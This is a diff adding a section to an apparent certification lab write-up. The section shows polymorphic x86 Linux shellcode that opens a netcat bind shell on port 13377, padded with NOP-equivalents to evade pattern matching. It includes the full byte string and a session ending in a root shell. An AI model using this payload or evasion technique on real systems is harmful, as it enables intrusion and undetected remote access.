@@ -255,6 +255,101 @@ mov al,11
 int 0x80
 ```
 
+Similarly to the techniques implemented within the previous shellcode, we will insert NOP equivalents which will difficult pattern matching. Nevertheless, these won't change execution at all!
+
+###### Final code:
+
+```term
+; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-804.php
+
+global _start
+
+_start:
+
+       sahf                    ; NOP Equivalent.
+       nop                     ; NOP Equivalent.
+       cmc                     ; NOP Equivalent.
+
+       xor eax,eax             ; Zeroes out EAX.
+       mul edx                 ; Zeroes out EDX through mul. NOP Equivalent.
+       push eax                ; NOP Equivalent.
+       pop edx                 ; NOP Equivalent.
+       push edx                ; NOP Equivalent.
+       pop eax                 ; NOP Equivalent.
+
+       push 0x37373333         ; 7733
+       std                     ; NOP Equivalent.
+       push 0x3170762d         ; 1pv-
+       mov edx, esp            ; Copies the value of ESP into EDX.
+       push eax                ; Pushes EAX null dword (0x00000000)
+       push 0x68732f6e         ; hs/n
+       std                     ; NOP Equivalent.
+       push 0x69622f65         ; ib/e
+       sahf                    ; NOP Equivalent.
+       push 0x76766c2d         ; vvl-
+       mov ecx,esp             ; Copies the value of ESP into ECX
+
+       push eax                ; NOP Equivalent.
+       push 0x636e2f2f         ; cn//
+       cmc                     ; NOP Equivalent.
+       push 0x2f2f2f2f         ; ////
+       inc edi                 ; NOP Equivalent.
+       inc esi                 ; NOP Equivalent.
+
+       push 0x6e69622f         ; nib/
+       mov ebx, esp            ; Copies the value of ESP into EBX.
+       push eax                ; Pushes EAX null dword (0x00000000)
+       cld                     ; NOP Equivalent.
+       push edx                ; Pushes value of EDX
+       push ecx                ; Pushes value of ECX
+       nop                     ; NOP Equivalent.
+       push ebx                ; Pushes value of EBX
+       cdq                     ; NOP Equivalent.
+       mov  ecx,esp            ; Copies value from ESP to ECX
+       push esi                ; NOP Equivalent.
+       pop edi                 ; NOP Equivalent.
+       push edi                ; NOP Equivalent.
+       pop esi                 ; NOP Equivalent.
+       pop ebp                 ; NOP Equivalent.
+       mov al,11               ; Call to execve().
+       int 0x80                ; Call to kernel.
+```
+
+Let's dump the shellcode and test it!
+
+```term
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# nasm -f elf32 1.asm -o 1.o && ld 1.o -o 1 
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x9e\x90\xf5\x31\xc0\xf7\xe2\x50\x5a\x52\x58\x68\x33\x33\x37\x37\xfd\x68\x2d\x76\x70\x31\x89\xe2\x50\x68\x6e\x2f\x73\x68\xfd\x68\x65\x2f\x62\x69\x9e\x68\x2d\x6c\x76\x76\x89\xe1\x50\x68\x2f\x2f\x6e\x63\xf5\x68\x2f\x2f\x2f\x2f\x47\x46\x68\x2f\x62\x69\x6e\x89\xe3\x50\xfc\x52\x51\x90\x53\x99\x89\xe1\x56\x5f\x57\x5e\x5d\xb0\x0b\xcd\x80"
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode#
+```
+
+#### EndGame #3
+
+```term
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# gcc polymorphic.c -o polymorphic -fno-stack-protector -z execstack -w 
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# ./polymorphic 
+Shellcode Length:  83
+listening on [any] 13377 ...
+192.168.100.139: inverse host lookup failed: Unknown host
+connect to [192.168.100.200] from (UNKNOWN) [192.168.100.139] 54156
+
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+root@whitecr0wz:~# rlwrap nc 192.168.100.200 13377 -v 
+192.168.100.200: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.100.200] 13377 (?) open
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# id 
+id 
+uid=0(root) gid=0(root) groups=0(root)
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode#
+```
+
+Original Size: 62 bytes
+Final Size: 83 bytes
+
+Increment: 34%
+
 ### Code
 
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
